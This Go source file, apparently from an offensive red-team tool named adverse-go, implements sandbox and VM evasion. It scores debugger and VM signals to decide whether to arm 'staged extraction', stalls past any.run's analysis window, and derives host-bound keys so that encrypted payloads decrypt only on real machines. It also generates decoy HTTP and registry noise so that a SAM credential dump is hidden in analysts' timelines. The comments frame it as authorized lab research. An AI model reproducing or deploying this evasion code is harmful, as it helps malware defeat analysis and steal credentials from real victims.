package behavioural

import (
	"context"
	"crypto/hkdf"
	"crypto/sha256"
	"fmt"
	"io"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/ashwnn/adverse-go/internal/anti"
	"github.com/ashwnn/adverse-go/internal/obfuscate"
)

// RealMachineThreshold is the minimum score required for Allow to return true.
// A real interactive desktop accumulates enough positive signals to exceed
// this; a sandbox or VM stays below. Tunable.
const RealMachineThreshold = 20

// strongTriggers are signal names that indicate a definite VM/sandbox/analyzer
// environment. If any of these are Triggered, scoreGate returns Allowed=false
// immediately (fail-closed) regardless of the weighted score.
// VM artifacts are weighted negative signals, not hard denies, so that a
// lab VM can still score as a real machine when positive signals outweigh them.
var strongTriggers = map[string]bool{
	"peb_beingdebugged":   true,
	"nt_query_debug_port": true,
	"tracer_pid":          true,
	"anyrun_artifact":     true,
	"env_sandbox":         true,
	"filesystem_sandbox":  true,
	"hostname_sandbox":    true,
}

// signalWeights maps signal names to their contribution to the real-machine
// confidence score. Positive = real desktop, negative = sandbox/VM.
// VM hard-artifact signals are weighted negative (not hard denies) so the
// threshold model can still allow on a lab VM when positive evidence outweighs them.
var signalWeights = map[string]int{
	// --- negative (VM/sandbox indicators) ---
	"anyrun_uptime":        -15,
	"anyrun_idle":          -10,
	"anyrun_specs":         -10,
	"anyrun_processes":     -10,
	"timing_emulation":     -10,
	"sleep_skipped":        -8,
	"opaque_integrity":     -5,
	"vm_mac_oui":           -10,
	"vm_gpu":               -8,
	"vm_disk":              -8,
	"vm_no_battery":        -5,
	"vm_no_audio":          -8,
	"vm_no_sensors":        -5,
	"vm_low_resolution":    -5,
	"vm_few_apps":          -10,
	"vm_few_user_files":    -8,
	"vm_smbios":            -15,
	"vm_cpuid_hypervisor":  -15,
	"vm_cpuid_vendor":      -15,
	"vm_registry_artifact": -15,
	"vm_file_driver":       -15,
	"vm_process":           -15,
	// --- positive (real desktop indicators) ---
	"real_smbios":     +8,
	"real_gpu":        +5,
	"real_battery":    +5,
	"real_audio":      +5,
	"real_sensors":    +5,
	"real_apps":       +10,
	"real_user_files": +8,
	"real_resolution": +3,
	"real_uptime":     +8,
	"real_processes":  +5,
}

// GateResult captures why the behavioural gate passed or fell back to benign.
type GateResult struct {
	Allowed bool               `json:"allowed"`
	Score   int                `json:"score"`
	Reasons []string           `json:"reasons"`
	Signals []anti.CheckResult `json:"signals"`
}

// scoreGate is the pure, testable scoring function. It accepts a slice of
// signals (from anti.AllSignals() + PlatformGate()) and returns whether
// staged work is allowed, the aggregate score, and human-readable reasons.
//
// Logic:
//  1. If any strong trigger is Triggered => deny immediately (fail-closed).
//  2. Otherwise, sum weights for all Triggered signals.
//  3. Allowed = score >= RealMachineThreshold.
func scoreGate(signals []anti.CheckResult) (allowed bool, score int, reasons []string) {
	// Step 1: strong-trigger check (fail-closed).
	for _, s := range signals {
		if s.Triggered && strongTriggers[s.Name] {
			return false, 0, []string{"strong:" + s.Name + "=" + s.Detail}
		}
	}

	// Step 2: weighted sum.
	total := 0
	for _, s := range signals {
		if !s.Triggered {
			continue
		}
		if w, ok := signalWeights[s.Name]; ok {
			total += w
			if w < 0 {
				reasons = append(reasons, fmt.Sprintf("%s=%d (%s)", s.Name, w, s.Detail))
			} else {
				reasons = append(reasons, fmt.Sprintf("%s=+%d (%s)", s.Name, w, s.Detail))
			}
		}
	}

	// Step 3: threshold decision.
	allowed = total >= RealMachineThreshold
	if !allowed {
		reasons = append(reasons, fmt.Sprintf("score=%d < threshold=%d", total, RealMachineThreshold))
	}
	return allowed, total, reasons
}

// Allow determines whether staged extraction should be armed. On !windows or
// in unit tests it consults anti + platform signals and returns a scored
// result. Strong triggers cause immediate denial (fail-closed). Below the
// threshold, staged work is suppressed (benign fallback) but this is NOT an
// error — it is the expected sandbox path.
func Allow(ctx context.Context) GateResult {
	return allowWithContext(ctx)
}

func allowWithContext(ctx context.Context) GateResult {
	signals := anti.AllSignals()
	platform := PlatformGate()
	signals = append(signals, platform...)

	allowed, score, reasons := scoreGate(signals)
	return GateResult{
		Allowed: allowed,
		Score:   score,
		Reasons: reasons,
		Signals: signals,
	}
}

// StallBeyondSandbox sleeps past any.run's default analysis window using a
// mix of CPU work and real Sleep that cannot be fully fast-forwarded. It
// respects ctx cancellation (kill switch).
func StallBeyondSandbox(ctx context.Context, minSeconds int) {
	if minSeconds <= 0 {
		minSeconds = 110
	}
	if minSeconds > 300 {
		minSeconds = 300
	}
	end := time.Now().Add(time.Duration(minSeconds) * time.Second)
	for time.Now().Before(end) {
		select {
		case <-ctx.Done():
			return
		default:
		}
		obfuscate.JunkWork(8192, uint64(time.Now().UnixNano()))
		// Small real sleep chunk — jitterCheck will catch fast-forwarding.
		select {
		case <-ctx.Done():
			return
		case <-time.After(time.Duration(4+time.Now().UnixNano()%9) * time.Millisecond):
		}
	}
}

// EnvironmentalKey derives a ChaCha20-capable 32-byte key from host-specific
// material using HKDF-SHA256. On Windows, this mixes MachineGuid + volume
// serial + ComputerName. On non-Windows (Linux CI) it returns a deterministic
// fixture key for tests.
//
// The key is HKDF'd so sandbox vs real host derive *different* keys — staged
// trampolines encrypted under the real-host key will not decrypt in the
// sandbox, making the run benign without needing an explicit "if sandbox then
// exit" branch that any.run signatures on.
func EnvironmentalKey() [32]byte {
	raw := platformEnvMaterial()
	// HKDF-SHA256 with info="adverse-behavioural-envkey" and salt from material hash.
	salt := sha256.Sum256(raw)
	derived, err := hkdf.Key(sha256.New, raw, salt[:], "adverse-behavioural-envkey", 32)
	if err != nil {
		// Fallback: SHA256 of raw (should never happen with SHA256 HKDF).
		h := sha256.Sum256(raw)
		return h
	}
	var key [32]byte
	copy(key[:], derived)
	return key
}

// --- decoy HTTP GETs for timeline pollution ---

// DecoyHTTPEnvVar gates all decoy egress. Decoy HTTP is disabled unless this
// environment variable is exactly "1" — the zero-egress default. A lab that
// wants timeline pollution must opt in explicitly.
const DecoyHTTPEnvVar = "ADVERSE_DECOY_HTTP"

// decoyMu guards decoyURLs and decoyURLsSet. Callers may configure decoys
// concurrently with MimicDecoyHTTP (e.g., a config reload racing the beacon
// loop), so every read and write goes through this lock.
var (
	decoyMu      sync.RWMutex
	decoyURLs    []string
	decoyURLsSet bool
)

// defaultDecoyURLs are public Microsoft connectivity/CRL endpoints used for
// benign-looking decoy GETs. These are explicitly designed for connectivity
// checks and are safe to hit in authorized labs — but only when the operator
// has opted in via ADVERSE_DECOY_HTTP=1.
var defaultDecoyURLs = []string{
	"http://www.msftconnecttest.com/connecttest.txt",
	"http://ctldl.windowsupdate.com/msdownload/update/v3/static/trustedr/en/authrootstl.cab",
}

// SetDecoyURLs overrides the default decoy URL list. Pass an empty non-nil
// slice to disable decoy HTTP activity entirely (e.g., air-gapped labs). Pass
// nil to reset to defaultDecoyURLs.
func SetDecoyURLs(urls []string) {
	decoyMu.Lock()
	defer decoyMu.Unlock()
	if urls == nil {
		decoyURLs = nil
		decoyURLsSet = false
		return
	}
	decoyURLs = append([]string(nil), urls...)
	decoyURLsSet = true
}

// getDecoyConfig returns a defensive copy of the decoy URL list.
func getDecoyConfig() (urls []string) {
	decoyMu.RLock()
	defer decoyMu.RUnlock()
	if decoyURLsSet {
		return append([]string(nil), decoyURLs...)
	}
	return append([]string(nil), defaultDecoyURLs...)
}

// MimicDecoyHTTP issues a few benign-looking HTTP GETs to public Microsoft
// connectivity/CRL endpoints. This pollutes any.run's network timeline with
// benign traffic preceding any sensitive activity. It respects ctx cancellation
// and ignores all errors.
//
// Egress is inert unless ADVERSE_DECOY_HTTP=1 (exact match); otherwise it
// returns immediately with no network activity. Dry-run/sandbox suppression is
// the caller's responsibility (the agent only calls this on the allowed path).
// This is for authorized lab research only.
func MimicDecoyHTTP(ctx context.Context) {
	if os.Getenv(DecoyHTTPEnvVar) != "1" {
		return
	}
	urls := getDecoyConfig()
	if len(urls) == 0 {
		return
	}
	client := &http.Client{
		Timeout: 5 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	for _, u := range urls {
		select {
		case <-ctx.Done():
			return
		default:
		}
		req, err := http.NewRequestWithContext(ctx, "GET", u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		// Drain and close to allow connection reuse.
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
}

// DelayedWork schedules fn to run after a delay that exceeds any.run's
// default analysis window. On Windows, this uses WaitableTimer + QueueUserAPC
// for alertable wait beyond the SleepEx hookable path. On non-Windows or if
// APC setup fails, falls back to StallBeyondSandbox's SleepEx approach.
// minSeconds is clamped to [110, 150]. Respects ctx cancellation.
func DelayedWork(ctx context.Context, minSeconds int, fn func()) {
	delayedWorkPlatform(ctx, minSeconds, fn)
}

// --- VEH int3 stub decryption ---

// RotatingXOR encrypts/decrypts data with a rotating XOR key derived from
// the provided key byte. This is symmetric: encrypt(encrypt(data)) == data.
func RotatingXOR(data []byte, key byte) []byte {
	out := make([]byte, len(data))
	k := key
	for i, b := range data {
		out[i] = b ^ k
		k = k ^ byte(i+1) // rotate key
	}
	return out
}

// ArmEncryptedTrampoline prepares an encrypted byte region for VEH-based
// decryption. Returns the decrypted plaintext and a done function that
// unregisters the VEH handler (must be called via defer). On non-Windows
// this is a no-op that returns the RotatingXOR-decrypted copy.
func ArmEncryptedTrampoline(enc []byte) (plain []byte, done func()) {
	return armEncryptedTrampolinePlatform(enc)
}

// IsAnyRunSandbox is a convenience that checks only the strong any.run signals.
func IsAnyRunSandbox() bool {
	for _, s := range PlatformGate() {
		if s.Triggered && (s.Name == "anyrun_artifact" || s.Name == "anyrun_uptime" || s.Name == "anyrun_idle" || s.Name == "anyrun_specs" || s.Name == "anyrun_processes") {
			return true
		}
	}
	return false
}

// MimicBenignRegistryNoise performs ~20 decoy registry opens on common HKCU
// autorun-adjacent keys. On Windows these are real NtOpenKey via direct syscall
// (but benign keys). On other platforms it performs benign local os.Stat calls.
// The point is to pollute any.run's API timeline so NtSaveKey-on-SAM is not
// the first/only registry write and is time-shifted.
func MimicBenignRegistryNoise() {
	platformMimicBenignRegistryNoise()
}
